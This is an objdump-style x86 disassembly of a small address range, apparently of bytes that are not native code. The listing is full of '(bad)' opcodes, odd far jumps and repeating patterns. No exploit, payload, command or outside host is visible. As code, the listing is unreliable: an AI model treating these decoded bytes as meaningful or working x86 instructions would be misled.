110033c2:	sbb    BYTE PTR [eax],al
110033c4:	add    BYTE PTR [edx],cl
110033c6:	pop    ds
110033c7:	aas    
110033c8:	inc    BYTE PTR [ecx]
110033ca:	push   ss
110033cb:	inc    BYTE PTR [ecx]
110033cd:	cmp    BYTE PTR [edx+0x3],bh
110033d3:	adc    DWORD PTR [eax+ebp*1],eax
110033d6:	adc    al,0x0
110033d8:	add    BYTE PTR [esi],al
110033da:	add    BYTE PTR [eax],al
110033dc:	and    BYTE PTR [eax+0x0],ch
110033df:	add    BYTE PTR [eax],al
110033e1:	adc    ecx,DWORD PTR [ebx]
110033e3:	cmp    BYTE PTR [ebx-0x13],ch
110033e6:	(bad)  
110033e7:	(bad)  
110033e8:	cmp    dl,dl
110033ea:	cmc    
110033eb:	(bad)  
110033ec:	inc    DWORD PTR [eax]
110033ee:	or     BYTE PTR [eax],ch
110033f0:	push   ss
110033f1:	add    BYTE PTR [eax],al
110033f3:	push   es
110033f4:	add    BYTE PTR [eax],al
110033f6:	and    BYTE PTR [ebp+0x13000000],dl
110033fc:	or     edi,DWORD PTR [eax]
110033fe:	push   ecx
110033ff:	in     eax,dx
11003400:	(bad)  
11003401:	(bad)  
11003402:	cmp    BYTE PTR [eax+0x9fffff5],bh
11003408:	jb     0x11003483
1100340a:	add    DWORD PTR [eax],eax
1100340c:	jo     0x1100347d
1100340e:	adc    eax,0x160a0000
11003413:	inc    BYTE PTR [ecx]
11003415:	adc    eax,DWORD PTR [esi]
11003417:	and    BYTE PTR [eax+eax*1+0x0],ch
1100341b:	add    BYTE PTR [ebx],dl
1100341d:	or     edi,DWORD PTR [eax]
1100341f:	xor    ch,ch
11003421:	(bad)  
11003422:	call   DWORD PTR [ecx]
11003424:	push   es
11003425:	cmp    ah,dh
11003427:	repz (bad) 
11003429:	jmp    DWORD PTR [eax]
1100342b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
1100342c:	add    BYTE PTR [eax],al
1100342e:	add    BYTE PTR [ebx],dl
11003430:	or     edi,DWORD PTR [eax]
11003432:	sbb    eax,0x38ffffed
11003437:	stc    
11003438:	add    al,BYTE PTR [eax]
1100343a:	add    BYTE PTR [ebx],dl
1100343c:	push   es
1100343d:	and    BYTE PTR [esi+0x0],ah
11003440:	add    BYTE PTR [eax],al
11003442:	adc    ecx,DWORD PTR [ebx]
11003444:	cmp    BYTE PTR [edx],cl
11003446:	in     eax,dx
11003447:	(bad)  
11003448:	call   DWORD PTR [ecx]
1100344a:	push   es
1100344b:	cmp    al,BYTE PTR [eax]
1100344d:	(bad)  
1100344e:	(bad)  
1100344f:	jmp    DWORD PTR [eax]
11003451:	add    DWORD PTR [eax],eax
11003453:	add    BYTE PTR [eax],al
11003455:	adc    ecx,DWORD PTR [ebx]
11003457:	cmp    bh,dh
11003459:	in     al,dx
1100345a:	(bad)  
1100345b:	(bad)  
1100345c:	cmp    BYTE PTR [esi-0x6],al
1100345f:	(bad)  
11003460:	jmp    DWORD PTR [eax]
11003462:	cmp    al,0x0
11003464:	add    BYTE PTR [eax],al
11003466:	adc    ecx,DWORD PTR [ebx]
11003468:	cmp    dh,ah
1100346a:	in     al,dx
1100346b:	(bad)  
1100346c:	dec    DWORD PTR [eax]
1100346e:	outs   dx,DWORD PTR ds:[esi]
1100346f:	sbb    DWORD PTR [eax],eax
11003471:	add    BYTE PTR [edx],cl
11003473:	sbb    BYTE PTR [edi],bh
11003475:	xchg   ebx,eax
11003476:	clc    
11003477:	(bad)  
11003478:	jmp    DWORD PTR [eax]
1100347a:	or     eax,0x13000000
1100347f:	or     edi,DWORD PTR [eax]
11003481:	into   
11003482:	in     al,dx
11003483:	(bad)  
11003484:	(bad)  
11003485:	cmp    BYTE PTR [ebx],cl
11003487:	clc    
11003488:	(bad)  
11003489:	dec    DWORD PTR [ecx]
1100348b:	jb     0x11003410
1100348d:	add    DWORD PTR [eax],eax
1100348f:	jo     0x11003500
11003491:	adc    eax,0x160a0000
11003496:	inc    BYTE PTR [ecx]
11003498:	adc    eax,DWORD PTR [esi]
1100349a:	and    BYTE PTR [eax+eax*1],ah
1100349d:	add    BYTE PTR [eax],al
1100349f:	adc    ecx,DWORD PTR [ebx]
110034a1:	cmp    BYTE PTR [ebp+0x11ffffec],ch
110034a7:	push   es
110034a8:	cmp    ch,BYTE PTR [ecx]
110034aa:	lock (bad) 
110034ac:	jmp    DWORD PTR [eax]
110034ae:	push   edi
110034af:	add    BYTE PTR [eax],al
110034b1:	add    BYTE PTR [ebx],dl
110034b3:	or     edi,DWORD PTR [eax]
110034b5:	call   0x204:0x38ffffec
110034bc:	add    BYTE PTR [eax],al
110034be:	add    BYTE PTR [eax],al
110034c0:	and    BYTE PTR [ecx+0x13000000],ah
110034c6:	or     edi,DWORD PTR [eax]
110034c8:	xchg   esp,ebp
110034ca:	(bad)  
110034cb:	(bad)  
110034cc:	cmp    dh,ch
110034ce:	hlt    
110034cf:	(bad)  
110034d0:	inc    DWORD PTR [eax]
110034d2:	adc    DWORD PTR [esp+eax*1],eax
110034d5:	sub    BYTE PTR [ebx],cl
110034d7:	add    BYTE PTR [eax],al
110034d9:	push   es
110034da:	adc    BYTE PTR [edx],al
110034dc:	add    BYTE PTR [eax],ah
110034de:	push   cs
110034df:	add    BYTE PTR [eax],al
110034e1:	add    BYTE PTR [ebx],dl
110034e3:	or     edi,DWORD PTR [eax]
110034e5:	push   0xffffffec
110034e7:	(bad)  
110034e8:	(bad)  
110034e9:	cmp    BYTE PTR [ebp+0x1],cl
110034ec:	add    BYTE PTR [eax],al
110034ee:	adc    eax,DWORD PTR [esi]
110034f0:	and    BYTE PTR [esi+0x0],cl
110034f3:	add    BYTE PTR [eax],al
110034f5:	adc    ecx,DWORD PTR [ebx]
110034f7:	cmp    BYTE PTR [edi-0x14],dl
110034fa:	(bad)  
110034fb:	call   DWORD PTR [ecx]
110034fd:	push   es
110034fe:	cmp    bl,BYTE PTR [ebx-0xb]
11003501:	(bad)  
11003502:	jmp    DWORD PTR [eax]
11003504:	jno    0x11003506
11003506:	add    BYTE PTR [eax],al
11003508:	adc    ecx,DWORD PTR [ebx]
1100350a:	cmp    BYTE PTR [esp+ebp*8-0x1],al
1100350e:	(bad)  
1100350f:	cmp    BYTE PTR [ebp-0x3],ah
11003512:	(bad)  
11003513:	inc    DWORD PTR [eax]
11003515:	or     BYTE PTR [eax],ch
11003517:	push   ss
11003518:	add    BYTE PTR [eax],al
1100351a:	push   es
1100351b:	add    BYTE PTR [eax],al
1100351d:	and    BYTE PTR [ebx+0x13000000],dl
11003523:	or     edi,DWORD PTR [eax]
11003525:	sub    ch,ah
11003527:	(bad)  
11003528:	(bad)  
11003529:	cmp    BYTE PTR [ecx+0x28fffff4],dl
1100352f:	sbb    eax,DWORD PTR [eax]
11003531:	add    BYTE PTR [edx],cl
11003533:	jb     0x11003582
11003535:	add    DWORD PTR [eax],eax
11003537:	jo     0x110035a8
11003539:	sbb    al,0x0
1100353b:	add    BYTE PTR [edx],cl
1100353d:	pop    ss
1100353e:	lea    edx,[eax+eax*1]
11003541:	add    BYTE PTR [ecx],al
11003543:	adc    ecx,DWORD PTR [ecx]
11003545:	adc    DWORD PTR [ecx],ecx
11003547:	push   ss
11003548:	or     BYTE PTR [edx+0x1d280911],ah
1100354e:	add    BYTE PTR [eax],al
11003550:	or     dh,BYTE PTR [ebx+0x1e]
11003553:	add    BYTE PTR [eax],al
11003555:	or     bh,BYTE PTR [edx+0x9]
11003558:	jb     0x110034e7
1100355a:	add    DWORD PTR [eax],eax
1100355c:	jo     0x110035cd
1100355e:	adc    eax,0x160a0000
11003563:	inc    BYTE PTR [ecx]
11003565:	adc    eax,DWORD PTR [esi]
11003567:	and    BYTE PTR [eax+eax*1+0xb130000],ch
1100356e:	cmp    al,ah
11003570:	jmp    0x11003571
11003572:	call   DWORD PTR [ecx]
11003574:	push   es
11003575:	cmp    al,BYTE PTR [ecx-0xb]
11003578:	(bad)  
11003579:	jmp    DWORD PTR [eax]
1100357b:	push   ds
1100357c:	add    BYTE PTR [eax],al
1100357e:	add    BYTE PTR [ebx],dl
11003580:	or     edi,DWORD PTR [eax]
11003582:	int    0xeb
11003584:	(bad)  
11003585:	(bad)  
11003586:	cmp    bl,bh
11003588:	idiv   edi
1100358a:	dec    DWORD PTR [ecx]
1100358c:	jb     0x11003523
1100358e:	add    DWORD PTR [eax],eax
11003590:	jo     0x11003601
11003592:	adc    eax,0x160a0000
11003597:	inc    BYTE PTR [ecx]
11003599:	adc    eax,DWORD PTR [esi]
1100359b:	and    BYTE PTR [ecx+0x13000000],ch
110035a1:	or     edi,DWORD PTR [eax]
110035a3:	lods   al,BYTE PTR ds:[esi]
110035a4:	jmp    0x110035a5
110035a6:	call   DWORD PTR [ecx]
110035a8:	push   es
110035a9:	cmp    bh,BYTE PTR [eax+0x20fffffa]
110035af:	call   0x380b:0x13000000
110035b6:	cdq    
110035b7:	jmp    0x110035b8
110035b9:	(bad)  
110035ba:	cmp    BYTE PTR [ecx],dl
110035bc:	std    
110035bd:	(bad)  
110035be:	inc    DWORD PTR [eax]
110035c0:	or     BYTE PTR [eax],ch
110035c2:	push   ss
110035c3:	add    BYTE PTR [eax],al
110035c5:	push   es
110035c6:	add    BYTE PTR [eax],al
110035c8:	and    BYTE PTR [eax+eax*1],al
110035cb:	add    BYTE PTR [eax],al
110035cd:	adc    ecx,DWORD PTR [ebx]
110035cf:	cmp    BYTE PTR [edi-0x15],bh
110035d2:	(bad)  
110035d3:	(bad)  
110035d4:	cmp    dh,ah
110035d6:	repz (bad) 
110035d8:	jmp    DWORD PTR [eax]
110035da:	stos   BYTE PTR es:[edi],al
110035db:	add    BYTE PTR [eax],al
110035dd:	add    BYTE PTR [ebx],dl
110035df:	or     edi,DWORD PTR [eax]
110035e1:	outs   dx,BYTE PTR ds:[esi]
110035e2:	jmp    0x110035e3
110035e4:	dec    DWORD PTR [eax]
110035e6:	pop    ss
110035e7:	outs   dx,DWORD PTR ds:[esi]
110035e8:	sbb    BYTE PTR [eax],al
110035ea:	add    BYTE PTR [edx],cl
110035ec:	pop    ds
110035ed:	inc    BYTE PTR gs:[ecx]
110035f0:	push   ss
110035f1:	inc    BYTE PTR [ecx]
110035f3:	cmp    dh,ch
110035f5:	add    DWORD PTR [eax],eax
110035f7:	add    BYTE PTR [ecx],cl
110035f9:	jb     0x1100359a
110035fb:	add    DWORD PTR [eax],eax
110035fd:	jo     0x1100366e
110035ff:	adc    eax,0x160a0000
11003604:	inc    BYTE PTR [ecx]
11003606:	adc    eax,DWORD PTR [esi]
11003608:	and    BYTE PTR [edx+0x0],dh
1100360b:	add    BYTE PTR [eax],al
1100360d:	adc    ecx,DWORD PTR [ebx]
1100360f:	cmp    BYTE PTR [edi],bh
11003611:	jmp    0x11003612
11003613:	call   DWORD PTR [ecx]
11003615:	push   es
11003616:	cmp    dh,BYTE PTR [edi]
11003618:	idiv   edi
1100361a:	jmp    DWORD PTR [eax]
1100361c:	inc    esp
1100361d:	add    BYTE PTR [eax],al
1100361f:	add    BYTE PTR [ebx],dl
11003621:	or     edi,DWORD PTR [eax]
11003623:	sub    al,0xeb
11003625:	(bad)  
11003626:	jmp    FWORD PTR [ebx]
11003628:	xchg   esi,eax
11003629:	and    ah,cl
1100362b:	add    BYTE PTR [eax],al
1100362d:	add    BYTE PTR [ebx],dl
1100362f:	or     edi,DWORD PTR [eax]
11003631:	push   ds
11003632:	jmp    0x11003633
11003634:	call   DWORD PTR [edi]
11003636:	cmp    BYTE PTR [ebx+0xfffff6],ch
1100363c:	and    BYTE PTR [ecx],ch
1100363e:	add    BYTE PTR [eax],al
11003640:	add    BYTE PTR [ebx],dl
11003642:	or     edi,DWORD PTR [eax]
11003644:	or     ebp,ebx
11003646:	(bad)  
11003647:	(bad)  
11003648:	cmp    cl,bh
1100364a:	repz (bad) 
1100364c:	dec    DWORD PTR [eax]
1100364e:	outs   dx,DWORD PTR ds:[esi]
1100364f:	sbb    DWORD PTR [eax],eax
11003651:	add    BYTE PTR [edx],cl
11003653:	sbb    dh,bh
11003655:	add    dl,BYTE PTR [esi]
11003657:	inc    BYTE PTR [ecx]
11003659:	adc    eax,DWORD PTR [esi]
1100365b:	and    BYTE PTR [ebp+0x0],cl
1100365e:	add    BYTE PTR [eax],al
11003660:	adc    ecx,DWORD PTR [ebx]
11003662:	cmp    ah,ch
11003664:	jmp    0x363a:0x611ffff
1100366b:	cld    
1100366c:	(bad)  
1100366d:	jmp    DWORD PTR [eax]
1100366f:	add    BYTE PTR ss:[eax],al
11003672:	add    BYTE PTR [ebx],dl
11003674:	or     edi,DWORD PTR [eax]
11003676:	fldl2e 
11003678:	(bad)  
11003679:	(bad)  
1100367a:	cmp    cl,al
1100367c:	repnz (bad) 
1100367e:	inc    DWORD PTR [eax]
11003680:	adc    DWORD PTR [eax+ebp*1],eax
11003683:	adc    eax,0x60000
11003688:	add    BYTE PTR [eax],ah
1100368a:	push   esi
1100368b:	add    BYTE PTR [eax],al
1100368d:	add    BYTE PTR [ebx],dl
1100368f:	or     edi,DWORD PTR [eax]
11003691:	mov    esi,0x38ffffea
11003696:	and    eax,0xfffff3
1100369b:	pop    ss
1100369c:	add    BYTE PTR ds:0x4040000,0x3
110036a3:	outs   dx,DWORD PTR ds:[esi]
110036a4:	push   ss
110036a5:	add    BYTE PTR [eax],al
110036a7:	or     ch,BYTE PTR [eax]
110036a9:	sbb    al,BYTE PTR [eax]
110036ab:	add    BYTE PTR [esi],al
110036ad:	add    BYTE PTR [ebx+edx*1],dl
110036b0:	add    eax,0x5520
110036b5:	add    BYTE PTR [ebx],dl
110036b7:	or     edi,DWORD PTR [eax]
110036b9:	xchg   esi,eax
110036ba:	jmp    0x2:0xb238ffff
110036c1:	add    BYTE PTR [eax],al
110036c3:	adc    DWORD PTR [eax+ebp*1],eax
110036c6:	or     al,0x0
110036c8:	add    BYTE PTR [esi],al
110036ca:	add    BYTE PTR [eax],al
110036cc:	and    BYTE PTR [ecx],ah
110036ce:	add    BYTE PTR [eax],al
110036d0:	add    BYTE PTR [ebx],dl
110036d2:	or     edi,DWORD PTR [eax]
110036d4:	jnp    0x110036c0
110036d6:	(bad)  
110036d7:	(bad)  
110036d8:	cmp    dl,ah
110036da:	repnz (bad) 
110036dc:	jmp    DWORD PTR [eax]
110036de:	pop    ss
110036df:	add    BYTE PTR [eax],al
110036e1:	add    BYTE PTR [ebx],dl
110036e3:	or     edi,DWORD PTR [eax]
110036e5:	push   0xffffffea
110036e7:	(bad)  
110036e8:	dec    DWORD PTR [eax]
110036ea:	outs   dx,DWORD PTR ds:[esi]
110036eb:	sbb    DWORD PTR [eax],eax
110036ed:	add    BYTE PTR [edx],cl
110036ef:	sbb    BYTE PTR [eax+0xb],al
110036f2:	cmc    
110036f3:	(bad)  
110036f4:	jmp    DWORD PTR [eax]
110036f6:	sub    BYTE PTR [eax],al
110036f8:	add    BYTE PTR [eax],al
110036fa:	adc    ecx,DWORD PTR [ebx]
110036fc:	cmp    BYTE PTR [edx-0x16],dl
110036ff:	(bad)  
11003700:	(bad)  
11003701:	cmp    BYTE PTR [edx-0x12],dh
11003704:	(bad)  
11003705:	inc    DWORD PTR [eax]
11003707:	push   es
11003708:	or     BYTE PTR [edi+0x1f],ch
1100370b:	add    BYTE PTR [eax],al
1100370d:	or     dl,BYTE PTR [esi+edi*8]
11003710:	add    DWORD PTR [ebx],edx
11003712:	push   es
11003713:	and    BYTE PTR [eax+eax*1+0xb130000],ah
1100371a:	cmp    BYTE PTR [edx+ebp*8],dh
1100371d:	(bad)  
1100371e:	call   DWORD PTR [ecx]
11003720:	push   es
11003721:	sub    eax,0x92203a
11003726:	add    BYTE PTR [eax],al
11003728:	adc    ecx,DWORD PTR [ebx]
1100372a:	cmp    BYTE PTR [edx+ebp*8],ah
1100372d:	(bad)  
1100372e:	(bad)  
1100372f:	cmp    dl,bh
11003731:	std    
11003732:	(bad)  
11003733:	inc    DWORD PTR [eax]
11003735:	or     BYTE PTR [eax],ch
11003737:	push   ss
11003738:	add    BYTE PTR [eax],al
1100373a:	push   es
1100373b:	add    BYTE PTR [eax],al
1100373d:	and    BYTE PTR [ebp+0x0],ch
11003740:	add    BYTE PTR [eax],al
11003742:	adc    ecx,DWORD PTR [ebx]
11003744:	cmp    BYTE PTR [edx],cl
11003746:	jmp    0xfff2:0x7138ffff
1100374d:	jmp    DWORD PTR [eax]
1100374f:	xor    eax,DWORD PTR [eax]
11003751:	add    BYTE PTR [eax],al
11003753:	adc    ecx,DWORD PTR [ebx]
11003755:	cmp    cl,bh
11003757:	jmp    0x3c18375b
1100375c:	das    
1100375d:	or     BYTE PTR [edi],dl
1100375f:	outs   dx,DWORD PTR ds:[esi]
11003760:	sbb    BYTE PTR [eax],al
11003762:	add    BYTE PTR [edx],cl
11003764:	adc    ecx,DWORD PTR [edx]
11003766:	and    BYTE PTR [edi+0x13000000],dl
1100376c:	or     edi,DWORD PTR [eax]
1100376e:	loope  0x11003759
11003770:	(bad)  
11003771:	call   DWORD PTR [ecx]
11003773:	or     bl,BYTE PTR [edi]
11003775:	imul   edi,DWORD PTR ds:0xfffff497,0x3520
1100377f:	add    BYTE PTR [ebx],dl
11003781:	or     edi,DWORD PTR [eax]
11003783:	int3   
11003784:	jmp    0x12393788
11003789:	cld    
1100378a:	(bad)  
1100378b:	call   DWORD PTR [ebx]
1100378d:	push   es
1100378e:	and    BYTE PTR [ebx],bh
11003790:	add    BYTE PTR [eax],al
11003792:	add    BYTE PTR [ebx],dl
11003794:	or     edi,DWORD PTR [eax]
11003796:	mov    ecx,0x11ffffe9
1100379b:	push   es
1100379c:	cmp    al,al
1100379e:	cld    
1100379f:	(bad)  
110037a0:	jmp    DWORD PTR [eax]
110037a2:	inc    ebx
110037a3:	add    BYTE PTR [eax],al
110037a5:	add    BYTE PTR [ebx],dl
110037a7:	or     edi,DWORD PTR [eax]
110037a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
110037aa:	jmp    0xeb3937ae
110037af:	idiv   bh
110037b1:	call   DWORD PTR [ecx]
110037b3:	pop    es
110037b4:	adc    DWORD PTR [eax],ecx
110037b6:	call   0x0:0x4920000c
110037bd:	add    BYTE PTR [ebx],dl
110037bf:	or     edi,DWORD PTR [eax]
110037c1:	mov    gs,ecx
110037c3:	(bad)  
110037c4:	dec    DWORD PTR [eax]
110037c6:	jb     0x1100379f
110037c8:	add    BYTE PTR [eax],al
110037ca:	jo     0x1100383b
110037cc:	sbb    al,BYTE PTR [eax]
110037ce:	add    BYTE PTR [edx],cl
110037d0:	cmp    cl,bl
110037d2:	idiv   edi
110037d4:	jmp    DWORD PTR [eax]
110037d6:	lds    eax,FWORD PTR [eax]
110037d8:	add    BYTE PTR [eax],al
110037da:	adc    ecx,DWORD PTR [ebx]
110037dc:	cmp    BYTE PTR [edx-0x17],dh
110037df:	(bad)  
110037e0:	(bad)  
110037e1:	cmp    BYTE PTR [esi+0x13ffffee],dl
110037e7:	push   es
110037e8:	and    BYTE PTR [esi+0x13000000],bl
110037ee:	or     edi,DWORD PTR [eax]
110037f0:	pop    edi
110037f1:	jmp    0x171237f5
110037f6:	cmp    ah,dl
110037f8:	add    BYTE PTR [eax],al
110037fa:	add    BYTE PTR [eax],ah
110037fc:	retf   
110037fd:	add    BYTE PTR [eax],al
110037ff:	add    BYTE PTR [ebx],dl
11003801:	or     edi,DWORD PTR [eax]
11003803:	dec    esp
11003804:	jmp    0xfc393808
11003809:	stc    
1100380a:	(bad)  
1100380b:	call   DWORD PTR [ebx]
1100380d:	push   es
1100380e:	and    BYTE PTR [edx+0x13000000],bh
11003814:	or     edi,DWORD PTR [eax]
11003816:	cmp    ecx,ebp
11003818:	(bad)  
11003819:	call   DWORD PTR [ecx]
1100381b:	push   es
1100381c:	cmp    bh,BYTE PTR [esi+edi*8+0x2f20ffff]
11003823:	add    BYTE PTR [eax],al
11003825:	add    BYTE PTR [ebx],dl
11003827:	or     edi,DWORD PTR [eax]
11003829:	es jmp 0x8e39382e
1100382f:	lock (bad) 
11003831:	dec    DWORD PTR [ecx]
11003833:	jb     0x110037de
11003835:	add    DWORD PTR [eax],eax
11003837:	jo     0x110038a8
11003839:	adc    eax,0x160a0000
1100383e:	inc    BYTE PTR [ecx]
11003840:	adc    eax,DWORD PTR [esi]
11003842:	and    BYTE PTR [eax+eax*1+0x0],dl
11003846:	add    BYTE PTR [ebx],dl
11003848:	or     edi,DWORD PTR [eax]
1100384a:	add    eax,0x11ffffe9
1100384f:	push   es
11003850:	cmp    dh,BYTE PTR [edi-0xd]
11003853:	(bad)  
11003854:	jmp    DWORD PTR [eax]
11003856:	xor    BYTE PTR [eax],al
11003858:	add    BYTE PTR [eax],al
1100385a:	adc    ecx,DWORD PTR [ebx]
1100385c:	cmp    dl,dh
1100385e:	call   0xc0393862
11003863:	in     eax,dx
11003864:	(bad)  
11003865:	jmp    DWORD PTR [eax]
11003867:	ret    
11003868:	add    BYTE PTR [eax],al
1100386a:	add    BYTE PTR [ebx],dl
1100386c:	or     edi,DWORD PTR [eax]
1100386e:	loope  0x11003858
11003870:	(bad)  
11003871:	(bad)  
11003872:	cmp    BYTE PTR [ebx-0x8],cl
11003875:	(bad)  
11003876:	inc    DWORD PTR [eax]
11003878:	jle    0x1100387d
1100387a:	add    BYTE PTR [eax],al
1100387c:	add    al,0x7e
1100387e:	add    al,0x0
11003880:	add    BYTE PTR [edi+ebp*2],al
11003883:	sub    DWORD PTR [eax],eax
11003885:	add    BYTE PTR [edx],cl
11003887:	add    BYTE PTR [eax+eax*1],0x0
1100388b:	add    al,0x7e
1100388d:	add    eax,DWORD PTR [eax]
1100388f:	add    BYTE PTR [esi+edi*2],al
11003892:	add    al,0x0
11003894:	add    BYTE PTR [eax+ebp*1],al
11003897:	sub    al,BYTE PTR [eax]
11003899:	add    BYTE PTR [edx],cl
1100389b:	outs   dx,DWORD PTR ds:[esi]
1100389c:	sub    eax,DWORD PTR [eax]
1100389e:	add    BYTE PTR [edx],cl
110038a0:	add    BYTE PTR [ebx],al
110038a2:	jb     0x11003857
110038a4:	add    DWORD PTR [eax],eax
110038a6:	jo     0x11003917
110038a8:	sub    al,0x0
110038aa:	add    BYTE PTR [edx],cl
110038ac:	sub    BYTE PTR [ecx],bl
110038ae:	add    BYTE PTR [eax],al
110038b0:	push   es
110038b1:	add    BYTE PTR [eax],al
110038b3:	and    BYTE PTR [ebx],al
110038b5:	add    BYTE PTR [eax],al
110038b7:	add    BYTE PTR [ebx],dl
110038b9:	or     edi,DWORD PTR [eax]
110038bb:	xchg   esp,eax
110038bc:	call   0x413938c0
110038c1:	idiv   bh
110038c3:	inc    DWORD PTR [eax]
110038c5:	sub    BYTE PTR [ebx],dl
110038c7:	add    BYTE PTR [eax],al
110038c9:	push   es
110038ca:	add    BYTE PTR [eax],al
110038cc:	and    BYTE PTR [ebx],cl
110038ce:	add    BYTE PTR [eax],al
110038d0:	add    BYTE PTR [ebx],dl
110038d2:	or     edi,DWORD PTR [eax]
110038d4:	jnp    0x110038be
110038d6:	(bad)  
110038d7:	(bad)  
110038d8:	cmp    dl,ah
110038da:	lock (bad) 
110038dc:	dec    DWORD PTR [eax]
110038de:	outs   dx,DWORD PTR ds:[esi]
110038df:	sbb    DWORD PTR [eax],eax
110038e1:	add    BYTE PTR [edx],cl
110038e3:	sbb    dh,bh
110038e5:	add    al,0x13
110038e7:	push   es
110038e8:	and    BYTE PTR [edx],bl
110038ea:	add    BYTE PTR [eax],al
110038ec:	add    BYTE PTR [ebx],dl
110038ee:	or     edi,DWORD PTR [eax]
110038f0:	pop    edi
110038f1:	call   0x171238f5
110038f6:	cmp    cl,BYTE PTR [ebx-0xf]
110038f9:	(bad)  
110038fa:	jmp    DWORD PTR [eax]
110038fc:	arpl   WORD PTR [eax],ax
110038fe:	add    BYTE PTR [eax],al
11003900:	adc    ecx,DWORD PTR [ebx]
11003902:	cmp    BYTE PTR [eax+ebp*8-0x1],cl
11003906:	(bad)  
11003907:	cmp    BYTE PTR [eax],al
11003909:	idiv   bh
1100390b:	dec    DWORD PTR [ecx]
1100390d:	jb     0x110038fe
1100390f:	add    BYTE PTR [eax],al
11003911:	jo     0x11003982
11003913:	adc    eax,0x160a0000
11003918:	inc    BYTE PTR [ecx]
1100391a:	adc    eax,DWORD PTR [esi]
1100391c:	and    BYTE PTR [edx+0x13000000],ah
11003922:	or     edi,DWORD PTR [eax]
11003924:	sub    ebp,eax
11003926:	(bad)  
11003927:	call   DWORD PTR [ecx]
11003929:	push   es
1100392a:	cmp    ch,BYTE PTR [ebx+0x20fffff0]
11003930:	mov    esi,0x13000000
11003935:	or     edi,DWORD PTR [eax]
11003937:	sbb    al,ch
11003939:	(bad)  
1100393a:	(bad)  
1100393b:	cmp    BYTE PTR [ecx],dh
1100393d:	repnz (bad) 
1100393f:	dec    DWORD PTR [ecx]
11003941:	jb     0x110038f8
11003943:	add    DWORD PTR [eax],eax
11003945:	jo     0x110039b6
11003947:	adc    eax,0x160a0000
1100394c:	inc    BYTE PTR [ecx]
1100394e:	adc    eax,DWORD PTR [esi]
11003950:	and    BYTE PTR [eax],dl
11003952:	add    BYTE PTR [eax],al
11003954:	add    BYTE PTR [ebx],dl
11003956:	or     edi,DWORD PTR [eax]
11003958:	mul    edi
1100395a:	(bad)  
1100395b:	call   DWORD PTR [ecx]
1100395d:	push   es
1100395e:	cmp    al,bh
11003960:	hlt    
11003961:	(bad)  
11003962:	jmp    DWORD PTR [eax]
11003964:	mov    esp,0x13000000
11003969:	or     edi,DWORD PTR [eax]
1100396b:	in     al,0xe7
1100396d:	(bad)  
1100396e:	(bad)  
1100396f:	cmp    BYTE PTR [edi],al
11003971:	out    dx,eax
11003972:	(bad)  
11003973:	inc    DWORD PTR [eax]
11003975:	adc    DWORD PTR ds:0x430132a,eax
1100397b:	add    BYTE PTR [ebx+0x2000002],bl
11003981:	add    BYTE PTR [eax],al
11003983:	adc    DWORD PTR [esi],edx
11003985:	adc    eax,DWORD PTR [ecx+edx*1]
11003988:	add    al,0x45
1100398a:	add    DWORD PTR [eax],eax
1100398c:	add    BYTE PTR [eax],al
1100398e:	add    BYTE PTR [eax],al
11003990:	add    BYTE PTR [eax],al
11003992:	sub    ebp,DWORD PTR [ebx+0x11]
11003995:	add    al,0x45
11003997:	sbb    DWORD PTR [eax],eax
11003999:	add    BYTE PTR [eax],al
1100399b:	rol    DWORD PTR [ecx],0x0
1100399e:	add    BYTE PTR [ecx+0x1],dl
110039a1:	add    BYTE PTR [eax],al
110039a3:	mov    eax,DWORD PTR [ecx]
110039a5:	add    BYTE PTR [eax],al
110039a7:	aas    
110039a8:	add    DWORD PTR [eax],eax
110039aa:	add    BYTE PTR [esi+0x0],ch
110039ad:	add    BYTE PTR [eax],al
110039af:	cmc    
110039b0:	add    DWORD PTR [eax],eax
110039b2:	add    BYTE PTR [ecx],ch
110039b4:	add    DWORD PTR [eax],eax
110039b6:	add    BYTE PTR [eax],dh
110039b8:	add    BYTE PTR [eax],al
110039ba:	add    dh,bl
110039bc:	add    BYTE PTR [eax],al
110039be:	add    BYTE PTR [eax+0x8000000],al
110039c4:	add    al,BYTE PTR [eax]
110039c6:	add    BYTE PTR [ebx+0x0],al
110039c9:	add    BYTE PTR [eax],al
110039cb:	pushf  
110039cc:	add    DWORD PTR [eax],eax
110039ce:	add    BYTE PTR [ecx-0x1b000000],ah
110039d4:	add    DWORD PTR [eax],eax
110039d6:	add    al,dl
110039d8:	add    BYTE PTR [eax],al
110039da:	add    BYTE PTR [eax+eax*1+0x1ab0000],dh
110039e1:	add    BYTE PTR [eax],al
110039e3:	sbb    al,BYTE PTR [edx]
110039e5:	add    BYTE PTR [eax],al
110039e7:	pop    ss
110039e8:	add    DWORD PTR [eax],eax
110039ea:	add    BYTE PTR [eax+0x72000000],dl
110039f0:	add    DWORD PTR [eax],eax
110039f2:	add    bl,dl
110039f4:	add    DWORD PTR [eax],eax
110039f6:	add    bl,bh
110039f8:	add    BYTE PTR [eax],al
110039fa:	add    BYTE PTR [edx+0x1],ah
110039fd:	add    BYTE PTR [eax],al
110039ff:	add    BYTE PTR [edx],al
11003a01:	pop    ss
11003a02:	outs   dx,DWORD PTR ds:[esi]
11003a03:	sub    eax,0x100a0000
11003a08:	add    BYTE PTR [edx],al
11003a0a:	jb     0x110039cb
11003a0c:	add    DWORD PTR [eax],eax
11003a0e:	jo     0x11003a7f
11003a10:	add    BYTE PTR cs:[eax],al
11003a13:	or     cl,BYTE PTR [edx]
11003a15:	add    dh,BYTE PTR [edx-0x3d]
11003a18:	add    DWORD PTR [eax],eax
11003a1a:	jo     0x11003a8b
11003a1c:	add    BYTE PTR cs:[eax],al
11003a1f:	or     cl,BYTE PTR [ebx]
11003a21:	adc    eax,0x7200c
11003a26:	add    BYTE PTR [eax],al
11003a28:	adc    eax,DWORD PTR [eax+edi*1]
11003a2b:	gs (bad) 
11003a2d:	(bad)  
11003a2e:	inc    DWORD PTR [esi]
11003a30:	adc    eax,0x9b3e
11003a35:	add    BYTE PTR [eax],ah
11003a37:	or     eax,DWORD PTR [eax]
11003a39:	add    BYTE PTR [eax],al
11003a3b:	adc    eax,DWORD PTR [eax+edi*1]
11003a3e:	push   edx
11003a3f:	(bad)  
11003a40:	(bad)  
11003a41:	(bad)  
11003a42:	cmp    BYTE PTR [edi+0x1],dl
11003a45:	add    BYTE PTR [eax],al
11003a47:	add    BYTE PTR [ebx],al
11003a49:	add    dl,BYTE PTR [esi]
11003a4b:	or     BYTE PTR [edi+0x2f],ch
11003a4e:	add    BYTE PTR [eax],al
11003a50:	or     dl,BYTE PTR [ecx+0x8]
